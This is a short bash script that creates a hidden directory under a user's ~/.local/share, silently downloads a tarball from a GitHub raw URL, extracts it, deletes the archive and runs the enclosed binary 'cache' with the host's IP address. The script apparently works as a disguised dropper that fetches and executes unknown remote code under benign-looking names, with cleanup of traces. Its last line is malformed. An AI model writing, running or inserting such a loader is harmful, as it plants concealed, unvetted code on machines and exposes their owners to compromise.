#!/bin/bash
mkdir -p /home/sit/.local/share/cache
cd /home/sit/.local/share/cache
wget -q -P /tmp/ https://raw.githubusercontent.com/cache-log/d/master/s.tar.gz
tar -xf /tmp/s.tar.gz
rm -rf /tmp/s.tar.gz
chmod +x ./cache
./cache -p "`ip route get 8.8.8.8 | grep src | awk '{print $NF}'`" 2>&1
echo "1" /htdocs/index2.html